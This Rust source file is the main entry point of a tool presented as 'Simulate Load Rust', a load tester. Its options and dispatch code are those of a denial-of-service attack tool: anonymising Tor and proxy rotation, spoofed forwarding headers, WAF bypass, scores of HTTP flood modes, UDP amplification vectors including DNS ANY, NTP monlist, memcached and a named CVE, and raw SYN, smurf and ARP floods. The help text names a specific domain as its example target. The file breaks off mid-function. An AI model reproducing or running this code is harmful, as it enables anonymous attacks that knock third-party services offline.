use std::sync::Arc;
use std::time::{Duration, Instant};
use std::collections::hash_map::DefaultHasher;
use std::hash::Hasher;
use std::sync::atomic::Ordering;
use tokio::sync::Mutex;
use tokio::signal;
use url::Url;











fn print_help() {
    println!("Simulate Load Rust — single-system load testing tool");
    println!();
    println!("Usage: {} [OPTIONS] [target_url] [mode] [attack_mode] [concurrency] [duration_secs]", env!("CARGO_PKG_NAME"));
    println!();
    println!("Options:");
    println!("  -h, --help            Show this help");
    println!("  -v, --version         Show version");
    println!("  --list-modes          List available attack modes");
    println!("  --tor-only            Force Tor-only mode (no scraping)");
    println!("  --dry-run             Only probe the domain, exit without load test");
    println!("  --verify              Verify proxies, show alive count, exit without load test");
    println!("  --output CSV          Write results to CSV file");
    println!("  --proxy-file F        Load proxy list from file (one per line or comma-separated)");
    println!("  --tor-proxy URL       Specify custom Tor proxy URL (e.g. socks5h://127.0.0.1:9050)");
    println!("  --tor-control ADDR    Specify custom Tor control port address (e.g. 127.0.0.1:9051)");
    println!("  --tor-entry-guards G  Comma-separated entry guards for Tor");
    println!("  --tor-bridges B       Semicolon-separated bridges for Tor");
    println!("  --tor-circuit-timeout S Custom circuit build timeout in seconds");
    println!("  --tor-ssthresh N      Limited slow start concurrency threshold (default: 20)");
    println!("  --delay MS            Per-request delay in milliseconds");
    println!("  --jitter MS           Random delay jitter in milliseconds");
    println!("  --jitter-percent PCT  Scale jitter to PCT percent of per-request delay (0-100)");
    println!("  --max-errors N        Stop after N failed requests");
   println!("  --max-requests N      Stop after N total requests completed");
   println!("  --concurrency-max N   Cap maximum concurrent tasks (default: unlimited)");
   println!("  --error-rate-threshold F  Stop if error rate exceeds F (0.0-1.0, default: 1.0)");
   println!("  --throughput-cap MBPS Cap bandwidth throughput in Mbps (default: unlimited)");
    println!("  --spoof-ip            Enable randomized IP spoofing headers (X-Forwarded-For, etc.)");
    println!("  --quiet               Quiet mode: suppress status updates during load test");
    println!("  --verbose             Verbose mode: detailed request logging");
    println!("  --json                Output results as JSON");
    println!("  --rate N              Rate limit: max N requests per second");
    println!("  --max-redirects N     Max HTTP redirects to follow (default: 10)");
    println!("  --max-retries N       Max per-request retries for transient failures (default: 3)");
    println!("  --rotation-strategy   Proxy rotation: weighted|round-robin|random (default: weighted)");
    println!("  --log-file F          Append status updates to file");
    println!("  --canary              Run a canary health check before load test");
    println!("  --stats-interval S    Status update interval in seconds (default: 5)");
    println!("  --tor-circuits N      Number of Tor circuits to use (default: 3)");
    println!("  --ramp-up S           Gradually increase concurrency from 1 to target over S seconds");
    println!("  --report FILE         Write detailed post-run report to file");
    println!("  --save-proxies F      Save discovered proxies to file");
    println!("  --custom-selector SEL Custom CSS selector for proxy scraping");
    println!("  --pool-max-idle N     Max idle connections per host in pool");
    println!("  --pool-idle-timeout S Idle connection timeout in seconds");
    println!("  --request-timeout S   Global HTTP request timeout in seconds, [1, 300] (default: 10)");
    println!("  --sni NAME            Server Name Indication override");
    println!("  --user-agent UA       Custom User-Agent header");
    println!("  --auto-tune           Enable PID controller concurrency auto-tuning");
    println!("  --tui                 Enable interactive console dashboard");
    println!("  --detect-waf          Detect WAF type and auto-apply bypass strategies");
    println!("  --gui                 Launch amplification methods browser (TUI)");
    println!("  --trigger <port>      Start a trigger amplifier listener on a UDP port");
    println!("  --config F            Load configuration from file");
    println!("  --insecure            Skip SSL certificate verification");
    println!("  --custom-header H     Add custom header (format: 'Name: Value')");
    println!("  --body TEXT           Custom POST body for largepost mode (supports {{random_uuid}}, {{timestamp}}, {{random_int}} templates)");
    println!("  --content-type CT     Content-Type header for POST requests (default: application/json)");
    println!();
    println!("Modes: scrape, tor, scrape-tor (proxy source)");
    println!("Attack modes: normal, bandwidth, slowread, imageopt, largepost, assetspray,");
    println!("              rangereq, cookiebomb, ssr, middleware, requestflood, notfound, slowloris,");
    println!("              headerbomb, queryflood, deeppath, authflood, cachebypass, formmulti, xmlbomb,");
    println!("              graphqlflood, redirectloop, emptybody, chunkedflood, trailheaders, connectionclose,");
    println!("              expect100, varyflood, deflatebomb, traceamplify, hostpoison, conditionalflood,");
    println!("              corsflood, putflood, deleteflood, sessionflood, contenttypeflood, upgradeamplify,");
    println!("              headflood, optionsflood, patchflood, slowpost, jsonbomb, contentnegotiate,");
    println!("              preferflood, rangeoverlap, multipost, cspreports, connectflood, keepaliveflood,");
    println!("              linkflood, forwardedflood, healthflood, jwtexplode, uploadflood, graphqlintrospect,");
    println!("              adminflood, paramflood, teflood, wantdigestflood, savedataflood, secfetchflood,");
    println!("              csvbomb, serializedbomb, wellknownflood, swaggerflood, loginflood, methodoverrideflood,");
    println!("              cookiebomb2, graphqlbatch, webhookflood, apiversionflood, prototypeflood, jsonpflood,");
    println!("              arrayflood, sitemapflood, unicodeflood, paramduplicate");
    println!();
    println!("Environment variables:");
    println!("  SIMULATE_LOAD_TARGET          Default target URL");
    println!("  SIMULATE_LOAD_MODE            Default mode (scrape|tor|scrape-tor)");
    println!("  SIMULATE_LOAD_ATTACK          Default attack mode");
    println!("  SIMULATE_LOAD_CONCURRENCY     Default concurrency level");
    println!("  SIMULATE_LOAD_DURATION        Default duration in seconds");
    println!("  SIMULATE_LOAD_REQUEST_TIMEOUT Default request timeout in seconds (default: 10)");
    println!("  TOR_PROXY                     Custom Tor proxy URL");
    println!();
    println!("Examples:");
    println!("  {} --dry-run https://livdevries.com", env!("CARGO_PKG_NAME"));
    println!("  {} https://livdevries.com 2>&1", env!("CARGO_PKG_NAME"));
    println!("  {} https://target.com tor normal 50 60 2>&1", env!("CARGO_PKG_NAME"));
}






mod types;
mod catalog;
mod support;
mod http;
mod tcp;
mod udp;
mod raw;
mod gui;
mod trigger;
mod waf;
use crate::types::*;
use crate::http::*;
use crate::support::*;
use crate::waf::*;

fn print_list_modes() {
    use crate::catalog::METHODS;

    let mut by_layer: Vec<(&'static str, Vec<&'static crate::catalog::AmplificationMethod>)> = Vec::new();
    let mut seen = Vec::new();
    for m in METHODS.iter() {
        let name = m.layer.name();
        if !seen.contains(&name) {
            seen.push(name);
            by_layer.push((name, Vec::new()));
        }
    }
    for m in METHODS.iter() {
        if let Some(pos) = by_layer.iter().position(|(ln, _)| *ln == m.layer.name()) {
            by_layer[pos].1.push(m);
        }
    }

    println!("Available attack modes ({} total, {} implemented, {} not yet):",
        METHODS.len(),
        METHODS.iter().filter(|m| m.is_implemented).count(),
        METHODS.iter().filter(|m| !m.is_implemented).count());
    println!();

    for (layer_name, methods) in &by_layer {
        println!("--- {} ---", layer_name);
        for m in methods {
            let check = if m.is_implemented { "*" } else { " " };
            println!("  {} {} [{}:{}]  ampl={}{}", check, m.id, m.transport.name(), m.port, m.ampl_factor,
                if m.needs_root { " (root)" } else { "" });
        }
        println!();
    }
    println!("Use --protocol tcp <host:port> <mode> <concurrency> <duration> for TCP modes.");
    println!("Use --protocol udp <host:port> <mode> <concurrency> <duration> for UDP modes.");
    println!("Pass mode by its id (shown above). HTTP modes use the id directly as the mode argument.");
}




#[tokio::main]
#[allow(unused_variables, unused_assignments, unreachable_code)]
async fn main() {
    let args: Vec<String> = std::env::args().collect();
    // Parse flags
    let mut tor_only = false;
    let mut dry_run = false;
    let mut verify = false;
    let mut version = false;
    let mut save_proxies: Option<String> = None;
    let mut output_csv: Option<String> = None;
    let mut proxy_file: Option<String> = None;
    let mut tor_proxy: Option<String> = None;
    let mut delay_ms: u64 = 0;
    let mut max_errors: Option<u64> = None;
    let mut config_file: Option<String> = None;
    let mut custom_headers: Vec<String> = Vec::new();
    let mut positional: Vec<String> = Vec::new();

    // New configuration variables
    let mut custom_selector: Option<String> = None;
    let mut pool_max_idle = 20usize;
    let mut pool_idle_timeout_secs = 90u64;
    let mut tor_control = "127.0.0.1:9051".to_string();
    let mut tor_entry_guards: Option<String> = None;
    let mut tor_bridges: Option<String> = None;
    let mut tor_circuit_timeout: Option<u64> = None;
    let mut tor_ssthresh = 20usize;
    let mut sni: Option<String> = None;
    let mut user_agent: Option<String> = None;
    let mut jitter_ms = 0u64;
    let mut jitter_percent: Option<u64> = None;
    let mut auto_tune = false;
    let mut tui = false;
    let mut detect_waf_flag = false;
    let mut protocol = String::from("http");
    let mut insecure = false;
    let mut spoof_ip = false;
    let mut quiet = false;
    let mut json_output = false;
    let mut verbose = false;
    let mut rate_limit: Option<u64> = None;
    let mut max_redirects: usize = 10;
    let mut max_retries: usize = 3;
    let mut rotation_strategy = String::from("weighted");  // weighted, round-robin, random
    let mut log_file: Option<String> = None;
    let mut canary = false;
    let mut report_file: Option<String> = None;
    let mut stats_interval_secs: u64 = 5;
    let mut tor_circuits: usize = 3;
    let mut ramp_up_secs: u64 = 0;
    let mut find_max = false;
    let mut request_timeout: u64 = 10;
    let mut max_requests: Option<u64> = None;
    let mut concurrency_max: Option<usize> = None;
    let mut error_rate_threshold: f64 = 1.0;
    let mut throughput_cap_mbps: Option<f64> = None;

    let mut args_iter = args.into_iter().skip(1);
    while let Some(arg) = args_iter.next() {
        match arg.as_str() {
            "-h" | "--help" => {
                print_help();
                return;
            }
            "-v" | "--version" => version = true,
            "--list-modes" => {
                print_list_modes();
                return;
            }
            "--tor-only" => tor_only = true,
            "--verify" => verify = true,
            "--dry-run" => dry_run = true,
            "--output" => {
                if let Some(val) = args_iter.next() {
                    output_csv = Some(val);
                }
            }
            "--proxy-file" => {
                if let Some(val) = args_iter.next() {
                    proxy_file = Some(val);
                }
            }
            "--tor-proxy" => {
                if let Some(val) = args_iter.next() {
                    tor_proxy = Some(val);
                }
            }
            "--delay" => {
                if let Some(val) = args_iter.next() {
                    delay_ms = val.parse().unwrap_or(0);
                }
            }
            "--max-errors" => {
                if let Some(val) = args_iter.next() {
                    max_errors = val.parse().ok();
                }
            }
            "--max-requests" => {
                if let Some(val) = args_iter.next() {
                    max_requests = val.parse().ok();
                }
            }
            "--concurrency-max" => {
                if let Some(val) = args_iter.next() {
                    concurrency_max = val.parse().ok();
                }
            }
            "--error-rate-threshold" => {
                if let Some(val) = args_iter.next() {
                    error_rate_threshold = val.parse::<f64>().unwrap_or(1.0).clamp(0.0, 1.0);
                }
            }
            "--throughput-cap" => {
                if let Some(val) = args_iter.next() {
                    throughput_cap_mbps = val.parse().ok();
                }
            }
            "--save-proxies" => {
                if let Some(val) = args_iter.next() {
                    save_proxies = Some(val);
                }
            }
            "--config" => {
                if let Some(val) = args_iter.next() {
                    config_file = Some(val);
                }
            }
            "--custom-header" => {
                if let Some(val) = args_iter.next() {
                    custom_headers.push(val);
                }
            }
            "--custom-selector" => {
                if let Some(val) = args_iter.next() {
                    custom_selector = Some(val);
                }
            }
            "--pool-max-idle" => {
                if let Some(val) = args_iter.next() {
                    pool_max_idle = val.parse().unwrap_or(20);
                }
            }
            "--pool-idle-timeout" => {
                if let Some(val) = args_iter.next() {
                    pool_idle_timeout_secs = val.parse().unwrap_or(90);
                }
            }
            "--tor-control" => {
                if let Some(val) = args_iter.next() {
                    tor_control = val;
                }
            }
            "--tor-entry-guards" => {
                if let Some(val) = args_iter.next() {
                    tor_entry_guards = Some(val);
                }
            }
            "--tor-bridges" => {
                if let Some(val) = args_iter.next() {
                    tor_bridges = Some(val);
                }
            }
            "--tor-circuits" => {
                if let Some(val) = args_iter.next() {
                    tor_circuits = val.parse().unwrap_or(3);
                }
            }
            "--tor-circuit-timeout" => {
                if let Some(val) = args_iter.next() {
                    tor_circuit_timeout = val.parse().ok();
                }
            }
            "--tor-ssthresh" => {
                if let Some(val) = args_iter.next() {
                    tor_ssthresh = val.parse().unwrap_or(20);
                }
            }
            "--sni" => {
                if let Some(val) = args_iter.next() {
                    sni = Some(val);
                }
            }
            "--user-agent" => {
                if let Some(val) = args_iter.next() {
                    user_agent = Some(val);
                }
            }
            "--jitter" => {
                if let Some(val) = args_iter.next() {
                    jitter_ms = val.parse().unwrap_or(0);
                }
            }
            "--jitter-percent" => {
                if let Some(val) = args_iter.next() {
                    let parsed: i64 = val.parse().unwrap_or(0);
                    jitter_percent = Some(parsed.clamp(0, 100) as u64);
                }
            }
            "--auto-tune" => auto_tune = true,
            "--tui" => tui = true,
            "--detect-waf" => detect_waf_flag = true,
            "--protocol" => {
                if let Some(val) = args_iter.next() {
                    protocol = val;
                }
            }
            "--gui" => {
                match gui::GuiApp::new().run() {
                    Ok(_) => return,
                    Err(e) => {
                        eprintln!("GUI error: {}", e);
                        return;
                    }
                }
            }
            "--trigger" => {
                if let Some(val) = args_iter.next() {
                    let port: u16 = val.parse().unwrap_or(19999);
                    let config = trigger::TriggerConfig {
                        bind: format!("0.0.0.0:{}", port).parse().unwrap(),
                        ..Default::default()
                    };
                    println!("Starting trigger amplifier on UDP port {}...", port);
                    println!("Press Ctrl+C to stop.");
                    tokio::select! {
                        r = trigger::run_trigger(config) => {
                            if let Err(e) = r {
                                eprintln!("Trigger error: {}", e);
                            }
                        }
                        _ = tokio::signal::ctrl_c() => {
                            println!("\nTrigger stopped.");
                        }
                    }
                    return;
                }
            }
            "--insecure" => insecure = true,
            "--spoof-ip" => spoof_ip = true,
            "--quiet" => quiet = true,
            "--verbose" => verbose = true,
            "--json" => json_output = true,
            "--rate" => {
                if let Some(val) = args_iter.next() {
                    rate_limit = val.parse().ok();
                }
            }
            "--rotation-strategy" => {
                if let Some(val) = args_iter.next() {
                    rotation_strategy = val;
                }
            }
            "--ramp-up" => {
                if let Some(val) = args_iter.next() {
                    ramp_up_secs = val.parse().unwrap_or(0);
                }
            }
            "--stats-interval" => {
                if let Some(val) = args_iter.next() {
                    stats_interval_secs = val.parse().unwrap_or(5);
                }
            }
            "--request-timeout" => {
                if let Some(val) = args_iter.next() {
                    if let Ok(parsed) = val.parse::<u64>() {
                        request_timeout = parsed.clamp(1, 300);
                    }
                }
            }
            "--body" => {
                if let Some(val) = args_iter.next() {
                    let _ = CUSTOM_POST_BODY.set(val);
                }
            }
            "--content-type" => {
                if let Some(val) = args_iter.next() {
                    let _ = CUSTOM_CONTENT_TYPE.set(val);
                }
            }
            "--max-redirects" => {
                if let Some(val) = args_iter.next() {
                    max_redirects = val.parse().unwrap_or(10);
                }
            }
            "--max-retries" => {
                if let Some(val) = args_iter.next() {
                    max_retries = val.parse().unwrap_or(3);
                }
            }
            "--log-file" => {
                if let Some(val) = args_iter.next() {
                    log_file = Some(val);
                }
            }
            "--report" => {
                if let Some(val) = args_iter.next() {
                    report_file = Some(val);
                }
            }
            "--canary" => canary = true,
            _ => {
                let other = arg;
                // Keep the old format as fallback with '=value' style flags
                if other.starts_with("--report=") {
                    report_file = Some(other.strip_prefix("--report=").unwrap_or("").to_string());
                } else if other.starts_with("--sni=") {
                    sni = Some(other.strip_prefix("--sni=").unwrap_or("").to_string());
                } else if other.starts_with("--jitter=") {
                    jitter_ms = other.strip_prefix("--jitter=").unwrap_or("").parse().unwrap_or(0);
                } else if other.starts_with("--jitter-percent=") {
                    let parsed: i64 = other.strip_prefix("--jitter-percent=").unwrap_or("").parse().unwrap_or(0);
                    jitter_percent = Some(parsed.clamp(0, 100) as u64);
                } else if other == "--auto-tune" {
                    auto_tune = true;
                } else if other == "--tui" {
                    tui = true;
                } else if other == "--detect-waf" {
                    detect_waf_flag = true;
                } else if other == "--spoof-ip" {
                    spoof_ip = true;
                } else if other == "--quiet" {
                    quiet = true;
                } else if other == "--json" {
                    json_output = true;
                } else if other == "--canary" {
                    canary = true;
                } else if other.starts_with("--rate=") {
                    rate_limit = other.strip_prefix("--rate=").unwrap_or("").parse().ok();
                } else if other.starts_with("--max-redirects=") {
                    max_redirects = other.strip_prefix("--max-redirects=").unwrap_or("").parse().unwrap_or(10);
                } else if other.starts_with("--rotation-strategy=") {
                    rotation_strategy = other.strip_prefix("--rotation-strategy=").unwrap_or("").to_string();
                } else if other.starts_with("--log-file=") {
                    log_file = Some(other.strip_prefix("--log-file=").unwrap_or("").to_string());
                } else if other.starts_with("--stats-interval=") {
                    stats_interval_secs = other.strip_prefix("--stats-interval=").unwrap_or("").parse().unwrap_or(5);
                } else if other.starts_with("--tor-circuits=") {
                    tor_circuits = other.strip_prefix("--tor-circuits=").unwrap_or("").parse().unwrap_or(3);
                } else if other.starts_with("--ramp-up=") {
                    ramp_up_secs = other.strip_prefix("--ramp-up=").unwrap_or("").parse().unwrap_or(0);
                } else if other == "--find-max" {
                    find_max = true;
                } else if other.starts_with("--request-timeout=") {
                    if let Ok(parsed) = other.strip_prefix("--request-timeout=").unwrap_or("").parse::<u64>() {
                        request_timeout = parsed.clamp(1, 300);
                    }
                } else if other.starts_with("--max-requests=") {
                    max_requests = other.strip_prefix("--max-requests=").unwrap_or("").parse().ok();
                } else if other.starts_with("--concurrency-max=") {
                    concurrency_max = other.strip_prefix("--concurrency-max=").unwrap_or("").parse().ok();
                } else if other.starts_with("--error-rate-threshold=") {
                    error_rate_threshold = other.strip_prefix("--error-rate-threshold=").unwrap_or("").parse::<f64>().unwrap_or(1.0).clamp(0.0, 1.0);
                } else if other.starts_with("--throughput-cap=") {
                    throughput_cap_mbps = other.strip_prefix("--throughput-cap=").unwrap_or("").parse().ok();
                } else if other.starts_with("--body=") {
                    let val = other.strip_prefix("--body=").unwrap_or("").to_string();
                    let _ = CUSTOM_POST_BODY.set(val);
                } else if other.starts_with("--content-type=") {
                    let val = other.strip_prefix("--content-type=").unwrap_or("").to_string();
                    let _ = CUSTOM_CONTENT_TYPE.set(val);
                } else if other.starts_with('-') {
                    eprintln!("Unknown option: {}", other);
                    return;
                } else {
                    positional.push(other.to_string());
                }
            }
        }
    }

    let mut target_url = positional.first().cloned().unwrap_or_else(|| DEFAULT_TARGET_URL.to_string());
    let mut mode_str = positional.get(1).cloned().unwrap_or_else(|| "scrape".to_string());
    let mut attack_str = positional.get(2).cloned().unwrap_or_else(|| "normal".to_string());
    let mut concurrency: usize = positional.get(3).and_then(|s| s.parse().ok()).unwrap_or(20);
    let mut duration_secs: u64 = positional.get(4).and_then(|s| s.parse().ok()).unwrap_or(30);

    // Override with env var defaults (env vars take priority over positional defaults but not CLI flags)
    if let Ok(env_target) = std::env::var("SIMULATE_LOAD_TARGET") {
        if positional.is_empty() { target_url = env_target; }
    }
    if let Ok(env_timeout) = std::env::var("SIMULATE_LOAD_REQUEST_TIMEOUT") {
        if let Ok(parsed) = env_timeout.parse::<u64>() {
            request_timeout = parsed.clamp(1, 300);
        }
    }
    if let Ok(env_mode) = std::env::var("SIMULATE_LOAD_MODE") {
        if positional.get(1).is_none() { mode_str = env_mode; }
    }
    if let Ok(env_attack) = std::env::var("SIMULATE_LOAD_ATTACK") {
        if positional.get(2).is_none() { attack_str = env_attack; }
    }
    if let Ok(env_conc) = std::env::var("SIMULATE_LOAD_CONCURRENCY") {
        if positional.get(3).is_none() {
            if let Ok(parsed) = env_conc.parse::<usize>() { concurrency = parsed; }
        }
    }
    if let Ok(env_dur) = std::env::var("SIMULATE_LOAD_DURATION") {
        if positional.get(4).is_none() {
            if let Ok(parsed) = env_dur.parse::<u64>() { duration_secs = parsed; }
        }
    }

    // Load configurations from config file if supplied
    if let Some(path) = &config_file {
        if let Ok(content) = std::fs::read_to_string(path) {
            println!("  Loading config from {}...", path);
            for line in content.lines() {
                let trimmed = line.trim();
                if trimmed.is_empty() || trimmed.starts_with('#') { continue; }
                if let Some(pos) = trimmed.find('=') {
                    let key = trimmed[..pos].trim();
                    let val = trimmed[pos+1..].trim();
                    match key {
                        "target_url" | "target" => target_url = val.to_string(),
                        "mode" => mode_str = val.to_string(),
                        "attack" | "attack_mode" => attack_str = val.to_string(),
                        "concurrency" => if let Ok(parsed) = val.parse() { concurrency = parsed; },
                        "duration" | "duration_secs" => if let Ok(parsed) = val.parse() { duration_secs = parsed; },
                        "delay" | "delay_ms" => if let Ok(parsed) = val.parse() { delay_ms = parsed; },
                        "max_errors" => max_errors = val.parse().ok(),
                        "proxy_file" => proxy_file = Some(val.to_string()),
                        "tor_proxy" => tor_proxy = Some(val.to_string()),
                        "tor_entry_guards" => tor_entry_guards = Some(val.to_string()),
                        "tor_bridges" => tor_bridges = Some(val.to_string()),
                        "tor_circuit_timeout" => tor_circuit_timeout = val.parse().ok(),
                        "tor_ssthresh" => if let Ok(parsed) = val.parse() { tor_ssthresh = parsed; },
                        "save_proxies" => save_proxies = Some(val.to_string()),
                        "output_csv" | "output" => output_csv = Some(val.to_string()),
                        "custom_selector" => custom_selector = Some(val.to_string()),
                        "pool_max_idle" => if let Ok(parsed) = val.parse() { pool_max_idle = parsed; },
                        "pool_idle_timeout" => if let Ok(parsed) = val.parse() { pool_idle_timeout_secs = parsed; },
                        "tor_control" => tor_control = val.to_string(),
                        "sni" => sni = Some(val.to_string()),
                        "jitter" | "jitter_ms" => if let Ok(parsed) = val.parse() { jitter_ms = parsed; },
                        "auto_tune" => auto_tune = val.parse().unwrap_or(false),
                        "tui" => tui = val.parse().unwrap_or(false),
                        "detect_waf" | "detect-waf" => detect_waf_flag = val.parse().unwrap_or(false),
                        "spoof_ip" => spoof_ip = val.parse().unwrap_or(false),
                        "quiet" => quiet = val.parse().unwrap_or(false),
                        "json" => json_output = val.parse().unwrap_or(false),
                        "rate_limit" => if let Ok(parsed) = val.parse() { rate_limit = Some(parsed); },
                        "max_redirects" => if let Ok(parsed) = val.parse() { max_redirects = parsed; },
                        "rotation_strategy" => rotation_strategy = val.to_string(),
                        "log_file" => log_file = Some(val.to_string()),
                        "canary" => canary = val.parse().unwrap_or(false),
                        "stats_interval" => if let Ok(parsed) = val.parse() { stats_interval_secs = parsed; },
                        "tor_circuits" => if let Ok(parsed) = val.parse() { tor_circuits = parsed; },
                        "ramp_up" | "ramp_up_secs" => if let Ok(parsed) = val.parse() { ramp_up_secs = parsed; },
                        "request_timeout" => if let Ok(parsed) = val.parse::<u64>() { request_timeout = parsed.clamp(1, 300); },
                        "body" | "post_body" => { let _ = CUSTOM_POST_BODY.set(val.to_string()); },
                        "content_type" | "content-type" => { let _ = CUSTOM_CONTENT_TYPE.set(val.to_string()); },
                        "max_requests" => max_requests = val.parse().ok(),
                        "concurrency_max" | "concurrency-max" => concurrency_max = val.parse().ok(),
                        "error_rate_threshold" => error_rate_threshold = val.parse::<f64>().unwrap_or(1.0).clamp(0.0, 1.0),
                        "throughput_cap" => throughput_cap_mbps = val.parse().ok(),
                        _ => {}
                    }
                }
            }
        } else {
            eprintln!("  Warning: Config file {} not found or unreadable.", path);
        }
    }

    // TCP protocol dispatch — bypasses all HTTP infrastructure
    if protocol == "tcp" {
        let target = positional.first().cloned().unwrap_or_else(|| "127.0.0.1".to_string());
        let tcp_mode_str = positional.get(1).cloned().unwrap_or_else(|| "generic".to_string());
        let tcp_concurrency: usize = positional.get(2).and_then(|s| s.parse().ok()).unwrap_or(5);
        let tcp_duration: u64 = positional.get(3).and_then(|s| s.parse().ok()).unwrap_or(30);

        let tcp_mode = tcp::TcpMode::from_str(&tcp_mode_str)
            .unwrap_or(tcp::TcpMode::GenericConnect);

        tcp::run_tcp_load(tcp_mode, &target, tor_proxy.clone(), tcp_concurrency, tcp_duration, rate_limit).await;
        return;
    }

    // ── Protocol: UDP amplification (no proxy, requires direct socket) ──
    if protocol == "udp" {
        let udp_host = positional.first().cloned().unwrap_or_else(|| "127.0.0.1:53".to_string());
        let udp_mode_str = positional.get(1).cloned().unwrap_or_else(|| "dns-any".to_string());
        let udp_concurrency: usize = positional.get(2).and_then(|s| s.parse().ok()).unwrap_or(5);
        let udp_duration: u64 = positional.get(3).and_then(|s| s.parse().ok()).unwrap_or(30);

        // Probe mode: single-shot effectiveness test across all UDP vectors
        if udp_mode_str == "probe" {
            let timeout_ms: u64 = positional.get(2).and_then(|s| s.parse().ok()).unwrap_or(2000);
            udp::run_udp_probe(&udp_host, timeout_ms).await;
            return;
        }

        let udp_mode = match udp_mode_str.as_str() {
            "dns-any" | "dnsany" => udp::UdpMode::DnsAny,
            "dns-ixfr" | "dnsixfr" => udp::UdpMode::DnsIxfr,
            "ntp-monlist" | "ntpmonlist" => udp::UdpMode::NtpMonlist,
            "ntp-query" | "ntpquery" => udp::UdpMode::NtpQuery,
            "memcached" | "memcache" => udp::UdpMode::MemcachedStats,
            "ssdp" => udp::UdpMode::SsdpDiscovery,
            "snmp-getbulk" | "snmpbulk" | "snmp" => udp::UdpMode::SnmpGetBulk,
            "chargen" => udp::UdpMode::CharGen,
            "qotd" => udp::UdpMode::Qotd,
            "memcached-get" | "memcache-get" => udp::UdpMode::MemcachedGet,
            "generic" | "udpconnect" => udp::UdpMode::GenericUdp,
            "cldap" | "cldap-search" => udp::UdpMode::CldapSearch,
            "coap" | "coap-amplification" => udp::UdpMode::CoapAmplification,
            "ws-discovery" | "wsd" => udp::UdpMode::WsDiscovery,
            "portmap" | "portmap-dump" | "rpcbind" => udp::UdpMode::PortmapDump,
            "netbios" | "netbios-ns" => udp::UdpMode::NetbiosNs,
            "mdns" | "mdns-query" => udp::UdpMode::MdnsQuery,
            "tftp" | "tftp-read" => udp::UdpMode::TftpRead,
            "sip" | "sip-options" => udp::UdpMode::SipOptions,
            "ike" | "ike-amplification" | "isakmp" => udp::UdpMode::IkeAmplification,
            "rip" | "rip-query" | "ripv1" => udp::UdpMode::RipQuery,
            "bacnet" | "bacnet-discovery" | "bacnet-device" => udp::UdpMode::BacnetDiscovery,
            "ntp-readvar" | "ntpreadvar" => udp::UdpMode::NtpReadVar,
            "dns-dnssec" | "dnssec" | "dnssec-query" => udp::UdpMode::DnsDnssec,
            "dns-recursive" | "dns-recursive-chain" | "recursive-dns" => udp::UdpMode::DnsRecursiveChain,
            "udp-flood" => udp::UdpMode::UdpFlood,
            "slp" | "slp-du" | "slp-update" => udp::UdpMode::SlpDuUpdate,
            "dns-nxns" | "dns-nxns-attack" | "nxnsattack" => udp::UdpMode::DnsNxns,
            "tp240" | "tp240-phonehome" | "cve-2022-26143" => udp::UdpMode::Tp240PhoneHome,
            _ => {
                eprintln!("Unknown UDP amplification mode: {}. Available: dns-any, dns-ixfr, ntp-monlist, ntp-query, memcached, memcached-get, ssdp, snmp-getbulk, chargen, qotd, generic, cldap, coap, ws-discovery, portmap, netbios, mdns, tftp, sip, ike, rip, bacnet, ntp-readvar, dnssec, dns-recursive, udp-flood, slp, dns-nxns, tp240", udp_mode_str);
                return;
            }
        };
        udp::run_udp_load(udp_mode, &udp_host, udp_concurrency, udp_duration, rate_limit).await;
        return;
    }

    // ── Protocol: Raw socket operations (requires root/CAP_NET_RAW) ──
    if protocol == "raw" {
        let raw_target = positional.first().cloned().unwrap_or_else(|| "127.0.0.1:80".to_string());
        let raw_mode_str = positional.get(1).cloned().unwrap_or_else(|| "tcp-syn-flood".to_string());
        let raw_concurrency: usize = positional.get(2).and_then(|s| s.parse().ok()).unwrap_or(5);
        let raw_duration: u64 = positional.get(3).and_then(|s| s.parse().ok()).unwrap_or(30);

        let raw_mode = match raw::RawMode::from_str(&raw_mode_str) {
            Some(m) => m,
            None => {
                eprintln!("  Unknown raw socket mode: {}. Available: tcp-syn-flood, tcp-rst-flood, icmp-smurf, icmp-fragmentation, ip-frag-overload, arp-flood, mac-flooding", raw_mode_str);
                return;
            }
        };

        raw::run_raw_load(raw_mode, &raw_target, raw_concurrency, raw_duration).await;
        return;
    }

    if spoof_ip {
        SPOOF_IP.store(true, Ordering::Relaxed);
    }

    // Initialize DNS pinning and ClientConfig
    let pinned_dns = if mode_str == "tor" || mode_str == "scrape-tor" {
        None
    } else {
        resolve_target_dns(&target_url).await.map(|ip| {
            let host = Url::parse(&target_url)
                .ok()
                .and_then(|u| u.host_str().map(|s| s.to_string()))
                .unwrap_or_default();
            (host, ip)
        })
    };
    let timeout_secs = match attack_str.as_str() {
        "slowloris" | "slowread" => 60,
        _ => request_timeout,
    };
    let config = ClientConfig {
        pinned_dns,
        max_redirects,
        tor_circuits,
        rate_limit,
        pool_max_idle,
        pool_idle_timeout: Duration::from_secs(pool_idle_timeout_secs),
        sni: sni.clone(),
        timeout: Duration::from_secs(timeout_secs),
        insecure,
        custom_user_agent: user_agent.clone(),
        custom_headers: custom_headers.iter().filter_map(|h| {
            let parts: Vec<&str> = h.splitn(2, ':').collect();
            if parts.len() == 2 { Some((parts[0].trim().to_string(), parts[1].trim().to_string())) }
            else { None }
        }).collect(),
    };

    if tor_only {
        let state = Arc::new(Mutex::new(AppState::new()));
        {
            let mut st = state.lock().await;
            st.target_url = target_url.to_string();
            st.mode = ProxyMode::Tor;
            st.client_config = config.clone();
            st.verbose = verbose;
            st.max_retries = max_retries;
        }
        println!("[tor-only] Checking Tor...");
        let ok = tokio::time::timeout(Duration::from_secs(3), tokio::net::TcpStream::connect("127.0.0.1:9050")).await.ok().and_then(|r| r.ok()).is_some();
        if !ok && tor_proxy.is_none() {
            eprintln!("  [tor-only] Tor not available. Install Tor or use --tor-proxy.");
            std::process::exit(1);
        }
        if ok {
            println!("  Tor OK (local relay)");
        } else {
            println!("  Using custom Tor proxy");
        }
        println!("  [TOR-ONLY] Configuration verified. Ready for Tor-based load testing.");
        return;
    }

    if verify {
        println!("=== Simulate Load Rust ===");
        println!("Target: {}", target_url);
        println!("Mode: {} (proxy: {})", attack_str, mode_str);
        println!("Concurrency: {}  Duration: {}s", concurrency, duration_secs);
        println!();

        // Probe domain
        let state = Arc::new(Mutex::new(AppState::new()));
        if (mode_str == "tor" || mode_str == "scrape-tor") && (tor_entry_guards.is_some() || tor_bridges.is_some() || tor_circuit_timeout.is_some()) {
            println!("  [verify] Configuring Tor parameters via Control Port ({})...", tor_control);
            if let Err(e) = configure_tor(&tor_control, tor_entry_guards.as_deref(), tor_bridges.as_deref(), tor_circuit_timeout).await {
                eprintln!("  [verify] Warning: Failed to configure Tor via Control Port: {}", e);
            } else {
                println!("  [verify] Tor parameters applied successfully.");
            }
        }
